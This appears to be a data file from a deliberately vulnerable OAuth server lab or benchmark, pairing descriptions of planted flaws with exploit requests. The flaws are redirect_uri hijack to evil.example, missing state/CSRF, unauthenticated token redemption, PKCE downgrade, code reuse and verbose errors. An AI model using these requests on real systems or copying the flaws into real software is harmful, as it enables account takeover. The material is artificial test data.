vulns.desc: Unvalidated redirect_uri: GET /authorize does NOT check redirect_uri against the client's registered allow-list, so it issues the authorization code to ANY attacker-supplied redirect_uri (302 Location). An attacker steals the auth code/token -> account takeover.
vulns.exploit: GET /authorize?client_id=webapp&response_type=code&redirect_uri=http://evil.example/grab -> 302 Location: http://evil.example/grab?code=... (code sent to attacker).

vulns.desc: Missing state parameter / CSRF: the authorization flow accepts but never requires or binds a `state` value, so there is no CSRF protection on the OAuth flow (login CSRF / authorization-code injection / account linking forgery).
vulns.exploit: GET /authorize?client_id=webapp&response_type=code&redirect_uri=...  with NO state -> a code is still issued and the response confirms state_provided:false; the flow has no anti-CSRF binding.

vulns.desc: Broken OAuth token endpoint: POST /token (a) does NOT authenticate the client (client_secret is ignored), (b) accepts an authorization code issued with a PKCE code_challenge WITHOUT the code_verifier (PKCE downgrade), and (c) never invalidates the code, so the same authorization code can be redeemed repeatedly (code reuse) for multiple access tokens.
vulns.exploit: POST /token grant_type=authorization_code&code=<code>&client_id=webapp (no client_secret, no code_verifier) -> access_token. Repeat the SAME code -> another access_token (reuse).

vulns.desc: Verbose errors: a malformed request to /token (e.g. an invalid OIDC `claims` JSON) triggers a full Python traceback in the response, disclosing source paths and internals.
Missing security headers on all responses: no Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options, or HSTS.
vulns.exploit: curl -I any endpoint -> none of CSP/XFO/XCTO/HSTS present.
